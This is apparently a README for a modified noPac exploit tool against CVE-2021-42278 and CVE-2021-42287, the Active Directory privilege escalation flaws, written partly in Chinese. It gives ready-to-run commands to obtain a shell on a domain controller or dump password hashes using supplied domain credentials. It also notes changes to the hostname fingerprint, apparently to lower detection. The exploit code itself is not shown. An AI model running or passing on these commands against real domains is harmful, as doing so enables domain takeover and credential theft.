# noPac
Exploiting CVE-2021-42278 and CVE-2021-42287 <br>
原项目noPac在实现上可能有点问题，导致在本地没有打通，于是参考sam-the-admin项目进行修改。

# 使用
```
pip3 install -r requirements.txt
# GetShell
python3 exp.py "domain/Username:Passw0rd" -dc-ip 192.168.0.254 -shell
# DumpHash
python3 exp.py "domain/Username:Passw0rd" -dc-ip 192.168.0.254 -dump
```


# 修改
- 修改了原版作者在Kali下的smbexec等执行路径问题
- 修改模拟上线主机名特征


# 参考
https://github.com/cube0x0/noPac <br>
https://github.com/WazeHell/sam-the-admin
